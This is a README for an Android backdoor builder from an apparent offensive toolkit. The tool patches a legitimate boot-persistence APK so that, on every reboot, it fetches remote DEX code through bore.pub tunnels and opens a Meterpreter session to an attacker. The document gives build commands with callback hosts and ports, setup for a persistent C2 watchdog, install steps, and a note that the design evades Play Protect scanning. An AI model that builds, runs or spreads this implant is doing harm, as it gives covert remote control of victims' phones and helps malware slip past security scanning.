# apk_backdoor

Patches a boot persistence APK to plant a secV agent and/or a Meterpreter stager that calls back over WAN via bore tunnels on every reboot.

**Status: working.** BOOT_COMPLETED fires after reboot, s.dex fetches from the bore tunnel, Meterpreter session comes in over SIM/WAN without port forwarding.

---

## What it does

1. Pulls the original `com.termux.boot` APK from the connected device (or use `--apk`)
2. Patches `BootReceiver.smali` to call `plantAgent()` on `BOOT_COMPLETED`
3. `plantAgent()` writes a boot script to the device boot directory once, sets it executable
4. Optionally (`--msf`) merges a Meterpreter `Payload.smali` that connects to `LHOST:LPORT` on every boot
5. Signs the patched APK with `secv.keystore` and writes to `output/`

The device-side payload fetches `s.dex` from the bore DEX tunnel (`bore.pub:BORE_DEX_PORT`) and loads it via `DexClassLoader`. No static Meterpreter ships in the APK, which gets past Play Protect static scanning.

---

## Quick Start

### From android_pentest module (recommended)

```bash
sudo secV
secV ❯ use android_pentest
secV (android_pentest) ❯ set operation rebuild
secV (android_pentest) ❯ set msf true
secV (android_pentest) ❯ set msf_lport 4444
secV (android_pentest) ❯ run device
```

LHOST is auto-detected. The rebuilt APK is written to `output/rebuilt.apk`.

### Direct invocation

```bash
cd tools/mobile/android/apk_backdoor

# Agent only (no Meterpreter)
python3 build_bootbuddy.py --lhost 192.168.1.10 --lport 8889 --http 8890

# With Meterpreter (WAN via bore)
python3 build_bootbuddy.py \
  --lhost auto \
  --msf \
  --msf-lport 4444 \
  --out output/syscore-final.apk
```

### Arguments

| Argument | Default | Description |
|----------|---------|-------------|
| `--apk PATH` | auto-pulled from device | Source boot persistence APK |
| `--device SERIAL` | first connected | ADB device serial |
| `--lhost IP` | auto-detected | Callback IP for agent + meterpreter |
| `--lport PORT` | `8889` | secV agent TCP C2 port |
| `--http PORT` | `8890` | secV agent HTTP C2 port |
| `--msf` | false | Merge msfvenom Meterpreter into APK |
| `--msf-lport PORT` | `4444` | Meterpreter callback port |
| `--keystore PATH` | `secv.keystore` | Signing keystore (auto-generated if missing) |
| `--out PATH` | `output/rebuilt.apk` | Output signed APK path |
| `--strip-shared-uid` | false | Remove `sharedUserId` from manifest |

---

## C2 Setup (WAN via bore tunnels)

The Meterpreter payload in the APK connects to `bore.pub:BORE_MSF_PORT` which tunnels to the attacker machine's `MSF_LPORT`. Use `c2_watchdog.sh` to manage the full C2 stack:

```bash
# Start C2 watchdog (manages bore tunnels + MSF handler + auto-restart)
bash ../c2_persistence/c2_watchdog.sh \
  --bore-dex-port 21062 \
  --bore-msf-port 37993 \
  --msf-port 4444 \
  --dex-dir output/ \
  --notify

# Or as a persistent service (after install.sh setup)
sudo systemctl enable --now secv-c2
sudo systemctl status secv-c2
```

The watchdog serves `output/s.dex` over HTTP via the bore DEX tunnel and monitors `sessions.log` for new Meterpreter connections.

---

## Install rebuilt APK on device

```bash
# Install via ADB
adb install -r output/rebuilt.apk

# Or let rebuild operation handle it (set install true)
secV (android_pentest) ❯ set install true
```

After installation, reboot the device. The `BOOT_COMPLETED` receiver fires, fetches the DEX, and opens a Meterpreter session automatically.

---

## Files

| File | Description |
|------|-------------|
| `build_bootbuddy.py` | APK patcher and builder |
| `secv.keystore` | Signing keystore (consistent APK signature) |
| `AgentService.smali` | Agent service smali fragment |
| `output/` | Built APKs (generated, not in git) |
| `workdir/` | Build artifacts (generated, not in git) |

---

## Dependencies

- `adb` - pull APK from device
- `apktool` - decompile/recompile APK
- `java` / `keytool` / `jarsigner` - signing
- `msfvenom` (optional) - generate Meterpreter payload for `--msf`
- `zipalign` (Android SDK build-tools) - APK alignment

All installed by `./install.sh`.
